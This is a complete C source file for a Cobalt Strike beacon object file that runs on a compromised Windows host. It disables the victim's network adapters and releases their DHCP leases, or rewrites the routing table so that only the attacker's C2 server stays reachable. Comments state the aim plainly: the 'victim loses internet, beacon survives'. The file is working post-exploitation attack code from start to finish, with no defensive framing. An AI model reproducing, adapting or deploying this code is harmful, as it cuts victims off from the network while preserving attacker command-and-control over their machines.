/*
 * bof_disable_nic.c — NIC control BOF for Cobalt Strike 4.x
 *
 * Actions:
 *   0 = DHCP release + disable all NICs except C2 adapter
 *   1 = Re-enable all NICs except C2 adapter
 *   2 = List adapters + CM device state
 *   3 = ISOLATE: add C2/32 static route, delete default gateway → victim loses
 *       internet, beacon survives
 *   4 = RESTORE: re-add default gateway, remove C2/32 static route
 *
 * Build (MinGW-w64):
 *   x86_64-w64-mingw32-gcc -o disable_nic.x64.obj -c bof_disable_nic.c \
 *       -masm=intel -Wall -fno-asynchronous-unwind-tables -I.
 */

#ifndef _WIN32_WINNT
#define _WIN32_WINNT 0x0601
#endif

#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>
#include <iphlpapi.h>
#include <cfgmgr32.h>
#include "beacon.h"

/* ═══════════════════════════════════════════════════════════════════════════
 * IMPORTS
 * ═══════════════════════════════════════════════════════════════════════════ */

/* IPHLPAPI — adapter/DHCP */
DECLSPEC_IMPORT DWORD WINAPI IPHLPAPI$GetBestInterface(IPAddr, PDWORD);
DECLSPEC_IMPORT ULONG WINAPI IPHLPAPI$GetAdaptersAddresses(ULONG, ULONG, PVOID,
    PIP_ADAPTER_ADDRESSES, PULONG);
DECLSPEC_IMPORT DWORD WINAPI IPHLPAPI$GetInterfaceInfo(PIP_INTERFACE_INFO, PULONG);
DECLSPEC_IMPORT DWORD WINAPI IPHLPAPI$IpReleaseAddress(PIP_ADAPTER_INDEX_MAP);

/* IPHLPAPI — routing (Vista+) */
DECLSPEC_IMPORT DWORD WINAPI IPHLPAPI$GetIpForwardTable2(ADDRESS_FAMILY Family,
    PMIB_IPFORWARD_TABLE2 *Table);
DECLSPEC_IMPORT VOID  WINAPI IPHLPAPI$FreeMibTable(PVOID Memory);
DECLSPEC_IMPORT DWORD WINAPI IPHLPAPI$CreateIpForwardEntry2(
    const MIB_IPFORWARD_ROW2 *Row);
DECLSPEC_IMPORT DWORD WINAPI IPHLPAPI$DeleteIpForwardEntry2(
    const MIB_IPFORWARD_ROW2 *Row);

/* CFGMGR32 */
DECLSPEC_IMPORT CONFIGRET WINAPI CFGMGR32$CM_Get_Device_ID_List_SizeW(
    PULONG, PCWSTR, ULONG);
DECLSPEC_IMPORT CONFIGRET WINAPI CFGMGR32$CM_Get_Device_ID_ListW(
    PCWSTR, PWCHAR, ULONG, ULONG);
DECLSPEC_IMPORT CONFIGRET WINAPI CFGMGR32$CM_Locate_DevNodeW(
    PDEVINST, DEVINSTID_W, ULONG);
DECLSPEC_IMPORT CONFIGRET WINAPI CFGMGR32$CM_Open_DevNode_Key(
    DEVINST, REGSAM, ULONG, ULONG, PHKEY, ULONG);
DECLSPEC_IMPORT CONFIGRET WINAPI CFGMGR32$CM_Get_DevNode_Status(
    PULONG, PULONG, DEVINST, ULONG);
DECLSPEC_IMPORT CONFIGRET WINAPI CFGMGR32$CM_Disable_DevNode(DEVINST, ULONG);
DECLSPEC_IMPORT CONFIGRET WINAPI CFGMGR32$CM_Enable_DevNode(DEVINST, ULONG);

/* ADVAPI32 */
DECLSPEC_IMPORT LONG WINAPI ADVAPI32$RegQueryValueExW(
    HKEY, LPCWSTR, LPDWORD, LPDWORD, LPBYTE, LPDWORD);
DECLSPEC_IMPORT LONG WINAPI ADVAPI32$RegCloseKey(HKEY);

/* KERNEL32 */
DECLSPEC_IMPORT HANDLE WINAPI KERNEL32$GetProcessHeap(VOID);
DECLSPEC_IMPORT LPVOID WINAPI KERNEL32$HeapAlloc(HANDLE, DWORD, SIZE_T);
DECLSPEC_IMPORT BOOL   WINAPI KERNEL32$HeapFree(HANDLE, DWORD, LPVOID);

/* ═══════════════════════════════════════════════════════════════════════════
 * CONSTANTS
 * ═══════════════════════════════════════════════════════════════════════════ */

#define HALLOC(n) KERNEL32$HeapAlloc(KERNEL32$GetProcessHeap(), HEAP_ZERO_MEMORY, (n))
#define HFREE(p)  KERNEL32$HeapFree(KERNEL32$GetProcessHeap(), 0, (p))

#ifndef CM_GETIDLIST_FILTER_CLASS
#define CM_GETIDLIST_FILTER_CLASS   0x00000200UL
#endif
#ifndef RegDisposition_OpenExisting
#define RegDisposition_OpenExisting 0x00000001UL
#endif
#ifndef CM_REGISTRY_SOFTWARE
#define CM_REGISTRY_SOFTWARE 0x00000001UL
#endif
#ifndef CM_LOCATE_DEVNODE_PHANTOM
#define CM_LOCATE_DEVNODE_PHANTOM 0x00000001UL
#endif
#ifndef CM_DISABLE_POLITE
#define CM_DISABLE_POLITE    0x00000001UL
#define CM_DISABLE_UI_NOT_OK 0x00000002UL
#endif

#define NET_CLASS_GUID_W L"{4D36E972-E325-11CE-BFC1-08002BE10318}"

/* RouteProtocolNetMgmt = 3 (NL_ROUTE_PROTOCOL enum) */
#define ROUTE_PROTO_NETMGMT 3

/* ═══════════════════════════════════════════════════════════════════════════
 * STRING / MISC HELPERS
 * ═══════════════════════════════════════════════════════════════════════════ */

static BOOL str_ieq(const char *a, const char *b) {
    while (*a && *b) {
        char ca = (*a >= 'a' && *a <= 'z') ? (char)(*a - 32) : *a;
        char cb = (*b >= 'a' && *b <= 'z') ? (char)(*b - 32) : *b;
        if (ca != cb) return FALSE;
        a++; b++;
    }
    return (*a == '\0' && *b == '\0');
}

static BOOL str_has(const char *hay, const char *needle) {
    if (!needle || !*needle) return TRUE;
    for (; *hay; hay++) {
        const char *h = hay, *n = needle;
        while (*h && *n && *h == *n) { h++; n++; }
        if (!*n) return TRUE;
    }
    return FALSE;
}

static void wchar_to_char(const WCHAR *src, char *dst, int dstLen) {
    int i = 0;
    while (src[i] && i < dstLen - 1) { dst[i] = (char)src[i]; i++; }
    dst[i] = '\0';
}

static DWORD parse_ipv4(const char *s) {
    DWORD r = 0;
    BYTE *b = (BYTE *)&r;
    for (int i = 0; i < 4; i++) {
        DWORD v = 0;
        while (*s >= '0' && *s <= '9') { v = v * 10 + (BYTE)(*s - '0'); s++; }
        if (i < 3 && *s == '.') s++;
        b[i] = (BYTE)v;
    }
    return r;
}

static void fmt_ipv4(const BYTE *b, char *buf) {
    int pos = 0;
    for (int i = 0; i < 4; i++) {
        if (i > 0) buf[pos++] = '.';
        BYTE v = b[i];
        if (v >= 100) { buf[pos++] = (char)('0' + v / 100); v = (BYTE)(v % 100); }
        if (v >= 10)  { buf[pos++] = (char)('0' + v / 10);  v = (BYTE)(v % 10);  }
        buf[pos++] = (char)('0' + v);
    }
    buf[pos] = '\0';
}

static int wlen(const WCHAR *s) {
    int n = 0;
    while (s && s[n]) n++;
    return n;
}

/* Zero out a MIB_IPFORWARD_ROW2 and set required defaults */
static void init_route_row(MIB_IPFORWARD_ROW2 *r) {
    BYTE *p = (BYTE *)r;
    for (SIZE_T i = 0; i < sizeof(MIB_IPFORWARD_ROW2); i++) p[i] = 0;
    r->ValidLifetime     = 0xFFFFFFFF;
    r->PreferredLifetime = 0xFFFFFFFF;
    r->Protocol          = ROUTE_PROTO_NETMGMT;
    r->SitePrefixLength  = 255;
}

/* ═══════════════════════════════════════════════════════════════════════════
 * CM DEVICE HELPERS
 * ═══════════════════════════════════════════════════════════════════════════ */

static WCHAR *cm_get_net_id_list(DWORD *pCount) {
    ULONG len = 0;
    CONFIGRET cr;
    BOOL useClass;

    /* CM_GETIDLIST_FILTER_CLASS (0x200) requires Win8+.
     * On Win7 it returns CR_INVALID_FLAG — fall back to no filter. */
    cr = CFGMGR32$CM_Get_Device_ID_List_SizeW(&len, NET_CLASS_GUID_W, CM_GETIDLIST_FILTER_CLASS);
    useClass = (cr == CR_SUCCESS && len > 0);

    if (!useClass) {
        len = 0;
        cr = CFGMGR32$CM_Get_Device_ID_List_SizeW(&len, NULL, 0);
    }

    if (cr != CR_SUCCESS || len == 0) {
        BeaconPrintf(CALLBACK_ERROR,
            "  [-] CM_Get_Device_ID_List_SizeW cr=0x%X\n", cr);
        if (pCount) *pCount = 0;
        return NULL;
    }

    WCHAR *buf = (WCHAR *)HALLOC(len * sizeof(WCHAR));
    if (!buf) { if (pCount) *pCount = 0; return NULL; }

    if (useClass)
        cr = CFGMGR32$CM_Get_Device_ID_ListW(NET_CLASS_GUID_W, buf, len, CM_GETIDLIST_FILTER_CLASS);
    else
        cr = CFGMGR32$CM_Get_Device_ID_ListW(NULL, buf, len, 0);

    if (cr != CR_SUCCESS) {
        BeaconPrintf(CALLBACK_ERROR, "  [-] CM_Get_Device_ID_ListW cr=0x%X\n", cr);
        HFREE(buf); if (pCount) *pCount = 0; return NULL;
    }

    /* When using no-filter, non-net devices won't have NetCfgInstanceId
     * and are naturally skipped by cm_read_net_guid(). */
    DWORD count = 0;
    for (WCHAR *p = buf; *p; p += wlen(p) + 1) count++;
    if (pCount) *pCount = count;
    return buf;
}

static BOOL cm_read_net_guid(DEVINST devInst, char *guidOut, DWORD guidLen) {
    HKEY hKey = NULL;
    if (CFGMGR32$CM_Open_DevNode_Key(devInst, KEY_READ, 0,
            RegDisposition_OpenExisting, &hKey, CM_REGISTRY_SOFTWARE) != CR_SUCCESS
        || !hKey) return FALSE;
    WCHAR wGuid[64] = {0};
    DWORD sz = sizeof(wGuid);
    LONG lr = ADVAPI32$RegQueryValueExW(
        hKey, L"NetCfgInstanceId", NULL, NULL, (LPBYTE)wGuid, &sz);
    ADVAPI32$RegCloseKey(hKey);
    if (lr != ERROR_SUCCESS || guidLen < 40) return FALSE;
    wchar_to_char(wGuid, guidOut, guidLen);
    return (guidOut[0] == '{');
}

static int cm_device_state(DEVINST devInst) {
    ULONG status = 0, problem = 0;
    if (CFGMGR32$CM_Get_DevNode_Status(&status, &problem, devInst, 0) != CR_SUCCESS)
        return -1;
    if (problem == CM_PROB_DISABLED) return 0;
    if (status & DN_STARTED)         return 1;
    return -1;
}

/* ═══════════════════════════════════════════════════════════════════════════
 * ADAPTER / DHCP HELPERS
 * ═══════════════════════════════════════════════════════════════════════════ */

static PIP_ADAPTER_ADDRESSES load_adapter_addresses(void) {
    ULONG len = 0;
    IPHLPAPI$GetAdaptersAddresses(AF_UNSPEC,
        GAA_FLAG_SKIP_ANYCAST | GAA_FLAG_SKIP_MULTICAST | GAA_FLAG_SKIP_DNS_SERVER,
        NULL, NULL, &len);
    if (!len) return NULL;
    PIP_ADAPTER_ADDRESSES p = (PIP_ADAPTER_ADDRESSES)HALLOC(len);
    if (!p) return NULL;
    if (IPHLPAPI$GetAdaptersAddresses(AF_UNSPEC,
            GAA_FLAG_SKIP_ANYCAST | GAA_FLAG_SKIP_MULTICAST | GAA_FLAG_SKIP_DNS_SERVER,
            NULL, p, &len) != NO_ERROR) { HFREE(p); return NULL; }
    return p;
}

static PIP_INTERFACE_INFO load_interface_info(void) {
    ULONG len = 0;
    IPHLPAPI$GetInterfaceInfo(NULL, &len);
    if (!len) return NULL;
    PIP_INTERFACE_INFO p = (PIP_INTERFACE_INFO)HALLOC(len);
    if (!p) return NULL;
    if (IPHLPAPI$GetInterfaceInfo(p, &len) != NO_ERROR) { HFREE(p); return NULL; }
    return p;
}

static BOOL get_c2_guid(const char *c2ip, char *guidOut, DWORD guidLen, DWORD *ifIdxOut) {
    DWORD addr = parse_ipv4(c2ip);
    if (!addr) return FALSE;
    DWORD ifIdx = 0;
    if (IPHLPAPI$GetBestInterface(addr, &ifIdx) != NO_ERROR) return FALSE;
    if (ifIdxOut) *ifIdxOut = ifIdx;
    PIP_ADAPTER_ADDRESSES pA = load_adapter_addresses();
    if (!pA) return FALSE;
    BOOL found = FALSE;
    for (PIP_ADAPTER_ADDRESSES a = pA; a; a = a->Next) {
        if (a->IfIndex == ifIdx) {
            int i = 0;
            while (a->AdapterName[i] && i < (int)guidLen - 1)
                { guidOut[i] = a->AdapterName[i]; i++; }
            guidOut[i] = '\0';
            found = TRUE;
            break;
        }
    }
    HFREE(pA);
    return found;
}

static void release_dhcp(const char *devGuid, PIP_INTERFACE_INFO pIfInfo) {
    if (!pIfInfo) {
        BeaconPrintf(CALLBACK_OUTPUT, "      DHCP: interface info unavailable\n");
        return;
    }
    char narrow[256];
    for (LONG i = 0; i < pIfInfo->NumAdapters; i++) {
        wchar_to_char(pIfInfo->Adapter[i].Name, narrow, sizeof(narrow));
        if (str_has(narrow, devGuid)) {
            DWORD r = IPHLPAPI$IpReleaseAddress(&pIfInfo->Adapter[i]);
            if (r == NO_ERROR)
                BeaconPrintf(CALLBACK_OUTPUT, "      DHCP: released OK\n");
            else if (r == ERROR_INVALID_PARAMETER)
                BeaconPrintf(CALLBACK_OUTPUT, "      DHCP: no active lease\n");
            else
                BeaconPrintf(CALLBACK_OUTPUT, "      DHCP: release err %lu\n", r);
            return;
        }
    }
    BeaconPrintf(CALLBACK_OUTPUT, "      DHCP: adapter not in TCPIP list\n");
}

/* ═══════════════════════════════════════════════════════════════════════════
 * ACTION: LIST
 * ═══════════════════════════════════════════════════════════════════════════ */

static void action_list(const char *c2Guid) {
    PIP_ADAPTER_ADDRESSES pA = load_adapter_addresses();
    if (!pA) { BeaconPrintf(CALLBACK_ERROR, "[-] GetAdaptersAddresses failed\n"); return; }

    BeaconPrintf(CALLBACK_OUTPUT, "\n  %-16s %-11s %-38s %s\n",
        "IP", "OperStatus", "GUID", "FriendlyName");
    BeaconPrintf(CALLBACK_OUTPUT, "  %-16s %-11s %-38s\n",
        "----------------", "-----------", "--------------------------------------");

    for (PIP_ADAPTER_ADDRESSES a = pA; a; a = a->Next) {
        char ipStr[20] = "N/A";
        for (PIP_ADAPTER_UNICAST_ADDRESS ua = a->FirstUnicastAddress; ua; ua = ua->Next) {
            if (ua->Address.lpSockaddr->sa_family == AF_INET) {
                BYTE *s4 = (BYTE *)&((SOCKADDR_IN *)ua->Address.lpSockaddr)->sin_addr;
                fmt_ipv4(s4, ipStr);
                break;
            }
        }
        const char *opStr;
        switch (a->OperStatus) {
            case IfOperStatusUp:         opStr = "UP";          break;
            case IfOperStatusDown:       opStr = "DOWN";        break;
            case IfOperStatusDormant:    opStr = "DORMANT";     break;
            case IfOperStatusNotPresent: opStr = "NOT_PRESENT"; break;
            default:                     opStr = "UNKNOWN";     break;
        }
        char fname[64]; fname[0] = '\0';
        wchar_to_char(a->FriendlyName, fname, sizeof(fname));
        char tag[6]; tag[0] = '\0';
        if (str_ieq(a->AdapterName, c2Guid)) {
            tag[0]=' '; tag[1]='['; tag[2]='C'; tag[3]='2'; tag[4]=']'; tag[5]='\0';
        }
        BeaconPrintf(CALLBACK_OUTPUT, "  %-16s %-11s %-38s %s%s\n",
            ipStr, opStr, a->AdapterName, fname, tag);
    }
    HFREE(pA);

    BeaconPrintf(CALLBACK_OUTPUT, "\n  CM device states:\n");
    DWORD count = 0;
    WCHAR *idList = cm_get_net_id_list(&count);
    if (!idList) {
        BeaconPrintf(CALLBACK_OUTPUT, "  (CM enumeration failed — see error above)\n");
        return;
    }
    BeaconPrintf(CALLBACK_OUTPUT, "  [CM] %lu devices\n", count);
    DWORD shown = 0;
    for (WCHAR *p = idList; *p; p += wlen(p) + 1) {
        DEVINST devInst = 0;
        if (CFGMGR32$CM_Locate_DevNodeW(&devInst, p, CM_LOCATE_DEVNODE_PHANTOM) != CR_SUCCESS)
            continue;
        char devGuid[64]; devGuid[0] = '\0';
        if (!cm_read_net_guid(devInst, devGuid, sizeof(devGuid))) continue;
        shown++;
        int st = cm_device_state(devInst);
        const char *stStr = (st == 1) ? "ENABLED " : (st == 0) ? "DISABLED" : "UNKNOWN ";
        char tag[6]; tag[0] = '\0';
        if (str_ieq(devGuid, c2Guid)) {
            tag[0]=' '; tag[1]='['; tag[2]='C'; tag[3]='2'; tag[4]=']'; tag[5]='\0';
        }
        BeaconPrintf(CALLBACK_OUTPUT, "  [%s]  %s%s\n", stStr, devGuid, tag);
    }
    if (shown == 0)
        BeaconPrintf(CALLBACK_OUTPUT, "  (no readable devices)\n");
    HFREE(idList);

    /* Route table summary */
    BeaconPrintf(CALLBACK_OUTPUT, "\n  IPv4 routes (0.0.0.0/0 and C2/32):\n");
    MIB_IPFORWARD_TABLE2 *pTbl = NULL;
    if (IPHLPAPI$GetIpForwardTable2(AF_INET, &pTbl) == NO_ERROR) {
        /* print all default and /32 routes for visibility */
        for (ULONG i = 0; i < pTbl->NumEntries; i++) {
            MIB_IPFORWARD_ROW2 *row = &pTbl->Table[i];
            if (row->DestinationPrefix.Prefix.si_family != AF_INET) continue;
            UINT8 plen = row->DestinationPrefix.PrefixLength;
            if (plen != 0 && plen != 32) continue;
            char dst[20], gw[20];
            fmt_ipv4((BYTE*)&row->DestinationPrefix.Prefix.Ipv4.sin_addr, dst);
            fmt_ipv4((BYTE*)&row->NextHop.Ipv4.sin_addr, gw);
            BeaconPrintf(CALLBACK_OUTPUT,
                "  %s/%-2u  via %-15s  if=%lu  metric=%lu\n",
                dst, plen, gw, (ULONG)row->InterfaceIndex, row->Metric);
        }
        IPHLPAPI$FreeMibTable(pTbl);
    }
}

/* ═══════════════════════════════════════════════════════════════════════════
 * ACTION: DISABLE / ENABLE NICs
 * ═══════════════════════════════════════════════════════════════════════════ */

static void action_disable(const char *c2Guid) {
    PIP_INTERFACE_INFO pIfInfo = load_interface_info();
    DWORD count = 0;
    WCHAR *idList = cm_get_net_id_list(&count);
    if (!idList) { if (pIfInfo) HFREE(pIfInfo); return; }

    for (WCHAR *p = idList; *p; p += wlen(p) + 1) {
        DEVINST devInst = 0;
        if (CFGMGR32$CM_Locate_DevNodeW(&devInst, p, CM_LOCATE_DEVNODE_PHANTOM) != CR_SUCCESS)
            continue;
        char devGuid[64]; devGuid[0] = '\0';
        if (!cm_read_net_guid(devInst, devGuid, sizeof(devGuid))) continue;
        if (str_ieq(devGuid, c2Guid)) {
            BeaconPrintf(CALLBACK_OUTPUT, "  [C2] skip  : %s\n", devGuid);
            continue;
        }
        int st = cm_device_state(devInst);
        if (st != 1) {
            if (st == 0)
                BeaconPrintf(CALLBACK_OUTPUT, "  [~~] already disabled: %s\n", devGuid);
            continue;
        }
        BeaconPrintf(CALLBACK_OUTPUT, "  [>>] disabling: %s\n", devGuid);
        release_dhcp(devGuid, pIfInfo);
        CONFIGRET cr = CFGMGR32$CM_Disable_DevNode(devInst, CM_DISABLE_POLITE | CM_DISABLE_UI_NOT_OK);
        if (cr == CR_SUCCESS) {
            int st2 = cm_device_state(devInst);
            BeaconPrintf(st2 == 0 ? CALLBACK_OUTPUT : CALLBACK_ERROR,
                st2 == 0 ? "      [+] DISABLED OK\n" : "      [-] disable sent, state=%d\n", st2);
        } else {
            BeaconPrintf(CALLBACK_ERROR, "      [-] CM_Disable_DevNode cr=0x%X\n", cr);
        }
    }
    HFREE(idList);
    if (pIfInfo) HFREE(pIfInfo);
}

static void action_enable(const char *c2Guid) {
    DWORD count = 0;
    WCHAR *idList = cm_get_net_id_list(&count);
    if (!idList) return;

    for (WCHAR *p = idList; *p; p += wlen(p) + 1) {
        DEVINST devInst = 0;
        if (CFGMGR32$CM_Locate_DevNodeW(&devInst, p, CM_LOCATE_DEVNODE_PHANTOM) != CR_SUCCESS)
            continue;
        char devGuid[64]; devGuid[0] = '\0';
        if (!cm_read_net_guid(devInst, devGuid, sizeof(devGuid))) continue;
        if (str_ieq(devGuid, c2Guid)) {
            BeaconPrintf(CALLBACK_OUTPUT, "  [C2] skip  : %s\n", devGuid);
            continue;
        }
        int st = cm_device_state(devInst);
        if (st != 0) {
            if (st == 1)
                BeaconPrintf(CALLBACK_OUTPUT, "  [~~] already enabled: %s\n", devGuid);
            continue;
        }
        BeaconPrintf(CALLBACK_OUTPUT, "  [>>] enabling: %s\n", devGuid);
        CONFIGRET cr = CFGMGR32$CM_Enable_DevNode(devInst, 0);
        if (cr == CR_SUCCESS) {
            int st2 = cm_device_state(devInst);
            BeaconPrintf(st2 == 1 ? CALLBACK_OUTPUT : CALLBACK_ERROR,
                st2 == 1 ? "      [+] ENABLED OK\n" : "      [-] enable sent, state=%d\n", st2);
        } else {
            BeaconPrintf(CALLBACK_ERROR, "      [-] CM_Enable_DevNode cr=0x%X\n", cr);
        }
    }
    HFREE(idList);
}

/* ═══════════════════════════════════════════════════════════════════════════
 * ACTION: ISOLATE  (route table — beacon survives, victim loses internet)
 * ═══════════════════════════════════════════════════════════════════════════ */

static void action_isolate(const char *c2ip, DWORD c2IfIdx) {
    DWORD c2Addr = parse_ipv4(c2ip);

    MIB_IPFORWARD_TABLE2 *pTbl = NULL;
    DWORD r = IPHLPAPI$GetIpForwardTable2(AF_INET, &pTbl);
    if (r != NO_ERROR) {
        BeaconPrintf(CALLBACK_ERROR, "[-] GetIpForwardTable2 err=%lu\n", r);
        return;
    }

    /* Step 1: find default route on the C2 interface → get gateway */
    BOOL foundGW = FALSE;
    MIB_IPFORWARD_ROW2 gwRow;
    for (ULONG i = 0; i < pTbl->NumEntries; i++) {
        MIB_IPFORWARD_ROW2 *row = &pTbl->Table[i];
        if (row->DestinationPrefix.Prefix.si_family != AF_INET) continue;
        if (row->DestinationPrefix.PrefixLength != 0)           continue;
        if (row->DestinationPrefix.Prefix.Ipv4.sin_addr.s_addr != 0) continue;
        if (row->InterfaceIndex != c2IfIdx)                     continue;
        gwRow    = *row;
        foundGW  = TRUE;
        char gwStr[20];
        fmt_ipv4((BYTE*)&row->NextHop.Ipv4.sin_addr, gwStr);
        BeaconPrintf(CALLBACK_OUTPUT, "  [*] C2 gateway : %s  (if=%lu)\n", gwStr, c2IfIdx);
        break;
    }
    if (!foundGW) {
        BeaconPrintf(CALLBACK_ERROR, "[-] No default route found on C2 interface %lu\n", c2IfIdx);
        IPHLPAPI$FreeMibTable(pTbl);
        return;
    }

    /* Step 2: add C2_IP/32 static route via same gateway */
    MIB_IPFORWARD_ROW2 c2Route;
    init_route_row(&c2Route);
    c2Route.InterfaceLuid                             = gwRow.InterfaceLuid;
    c2Route.InterfaceIndex                            = gwRow.InterfaceIndex;
    c2Route.DestinationPrefix.Prefix.si_family        = AF_INET;
    c2Route.DestinationPrefix.Prefix.Ipv4.sin_family  = AF_INET;
    c2Route.DestinationPrefix.Prefix.Ipv4.sin_addr.s_addr = c2Addr;
    c2Route.DestinationPrefix.PrefixLength            = 32;
    c2Route.NextHop                                   = gwRow.NextHop;
    c2Route.Metric                                    = 1;

    r = IPHLPAPI$CreateIpForwardEntry2(&c2Route);
    if (r != NO_ERROR && r != ERROR_OBJECT_ALREADY_EXISTS) {
        BeaconPrintf(CALLBACK_ERROR, "[-] CreateIpForwardEntry2 (C2/32) err=%lu\n", r);
        IPHLPAPI$FreeMibTable(pTbl);
        return;
    }
    BeaconPrintf(CALLBACK_OUTPUT, "  [+] Added route  : %s/32\n", c2ip);

    /* Step 3: delete ALL 0.0.0.0/0 routes */
    DWORD deleted = 0;
    for (ULONG i = 0; i < pTbl->NumEntries; i++) {
        MIB_IPFORWARD_ROW2 *row = &pTbl->Table[i];
        if (row->DestinationPrefix.Prefix.si_family != AF_INET) continue;
        if (row->DestinationPrefix.PrefixLength != 0)           continue;
        if (row->DestinationPrefix.Prefix.Ipv4.sin_addr.s_addr != 0) continue;
        r = IPHLPAPI$DeleteIpForwardEntry2(row);
        if (r == NO_ERROR) {
            char gwStr[20];
            fmt_ipv4((BYTE*)&row->NextHop.Ipv4.sin_addr, gwStr);
            BeaconPrintf(CALLBACK_OUTPUT,
                "  [+] Deleted route: 0.0.0.0/0 via %s (if=%lu)\n",
                gwStr, (ULONG)row->InterfaceIndex);
            deleted++;
        }
    }
    if (deleted == 0)
        BeaconPrintf(CALLBACK_OUTPUT, "  [!] No default routes deleted\n");

    IPHLPAPI$FreeMibTable(pTbl);
    BeaconPrintf(CALLBACK_OUTPUT,
        "  [*] Victim isolated — only %s/32 reachable, beacon alive\n", c2ip);
}

/* ═══════════════════════════════════════════════════════════════════════════
 * ACTION: RESTORE  (put default route back, remove C2/32)
 * ═══════════════════════════════════════════════════════════════════════════ */

static void action_restore(const char *c2ip) {
    DWORD c2Addr = parse_ipv4(c2ip);

    MIB_IPFORWARD_TABLE2 *pTbl = NULL;
    DWORD r = IPHLPAPI$GetIpForwardTable2(AF_INET, &pTbl);
    if (r != NO_ERROR) {
        BeaconPrintf(CALLBACK_ERROR, "[-] GetIpForwardTable2 err=%lu\n", r);
        return;
    }

    /* Step 1: find our C2/32 route to recover gateway info */
    BOOL foundC2 = FALSE;
    MIB_IPFORWARD_ROW2 c2Route;
    for (ULONG i = 0; i < pTbl->NumEntries; i++) {
        MIB_IPFORWARD_ROW2 *row = &pTbl->Table[i];
        if (row->DestinationPrefix.Prefix.si_family != AF_INET) continue;
        if (row->DestinationPrefix.PrefixLength != 32)          continue;
        if (row->DestinationPrefix.Prefix.Ipv4.sin_addr.s_addr != c2Addr) continue;
        c2Route  = *row;
        foundC2  = TRUE;
        break;
    }
    if (!foundC2) {
        BeaconPrintf(CALLBACK_ERROR,
            "[-] C2/32 route not found — already restored or never isolated?\n");
        IPHLPAPI$FreeMibTable(pTbl);
        return;
    }

    /* Step 2: add 0.0.0.0/0 back using same gateway */
    MIB_IPFORWARD_ROW2 defRoute;
    init_route_row(&defRoute);
    defRoute.InterfaceLuid                             = c2Route.InterfaceLuid;
    defRoute.InterfaceIndex                            = c2Route.InterfaceIndex;
    defRoute.DestinationPrefix.Prefix.si_family        = AF_INET;
    defRoute.DestinationPrefix.Prefix.Ipv4.sin_family  = AF_INET;
    defRoute.DestinationPrefix.Prefix.Ipv4.sin_addr.s_addr = 0;
    defRoute.DestinationPrefix.PrefixLength            = 0;
    defRoute.NextHop                                   = c2Route.NextHop;
    defRoute.Metric                                    = 1;

    r = IPHLPAPI$CreateIpForwardEntry2(&defRoute);
    if (r != NO_ERROR && r != ERROR_OBJECT_ALREADY_EXISTS) {
        BeaconPrintf(CALLBACK_ERROR, "[-] CreateIpForwardEntry2 (default) err=%lu\n", r);
        IPHLPAPI$FreeMibTable(pTbl);
        return;
    }
    char gwStr[20];
    fmt_ipv4((BYTE*)&c2Route.NextHop.Ipv4.sin_addr, gwStr);
    BeaconPrintf(CALLBACK_OUTPUT, "  [+] Restored route: 0.0.0.0/0 via %s\n", gwStr);

    /* Step 3: remove C2/32 static route */
    r = IPHLPAPI$DeleteIpForwardEntry2(&c2Route);
    if (r == NO_ERROR)
        BeaconPrintf(CALLBACK_OUTPUT, "  [+] Removed route : %s/32\n", c2ip);
    else
        BeaconPrintf(CALLBACK_ERROR,  "  [!] Delete C2/32 err=%lu\n", r);

    IPHLPAPI$FreeMibTable(pTbl);
    BeaconPrintf(CALLBACK_OUTPUT, "  [*] Routing restored.\n");
}

/* ═══════════════════════════════════════════════════════════════════════════
 * ENTRY POINT
 * ═══════════════════════════════════════════════════════════════════════════ */

void go(char *args, int len) {
    datap parser;
    BeaconDataParse(&parser, args, len);
    char *c2ip   = BeaconDataExtract(&parser, NULL);
    int   action = BeaconDataInt(&parser);

    if (!c2ip || c2ip[0] == '\0') {
        BeaconPrintf(CALLBACK_ERROR, "[-] No C2 IP provided\n");
        return;
    }

    char c2Guid[64]; c2Guid[0] = '\0';
    DWORD c2IfIdx = 0;
    if (!get_c2_guid(c2ip, c2Guid, sizeof(c2Guid), &c2IfIdx)) {
        BeaconPrintf(CALLBACK_ERROR, "[-] Cannot resolve adapter for: %s\n", c2ip);
        return;
    }
    BeaconPrintf(CALLBACK_OUTPUT,
        "[*] C2: %s  |  GUID: %s  |  IfIdx: %lu\n", c2ip, c2Guid, c2IfIdx);

    switch (action) {
        case 0:
            BeaconPrintf(CALLBACK_OUTPUT, "[*] ===== DISABLE NICs =====\n");
            action_disable(c2Guid);
            break;
        case 1:
            BeaconPrintf(CALLBACK_OUTPUT, "[*] ===== ENABLE NICs =====\n");
            action_enable(c2Guid);
            break;
        case 2:
            BeaconPrintf(CALLBACK_OUTPUT, "[*] ===== LIST =====\n");
            action_list(c2Guid);
            break;
        case 3:
            BeaconPrintf(CALLBACK_OUTPUT, "[*] ===== ISOLATE (route) =====\n");
            action_isolate(c2ip, c2IfIdx);
            break;
        case 4:
            BeaconPrintf(CALLBACK_OUTPUT, "[*] ===== RESTORE (route) =====\n");
            action_restore(c2ip);
            break;
        default:
            BeaconPrintf(CALLBACK_ERROR,
                "[-] Invalid action %d  (0=disable 1=enable 2=list 3=isolate 4=restore)\n",
                action);
            return;
    }
    BeaconPrintf(CALLBACK_OUTPUT, "[*] Done.\n");
}
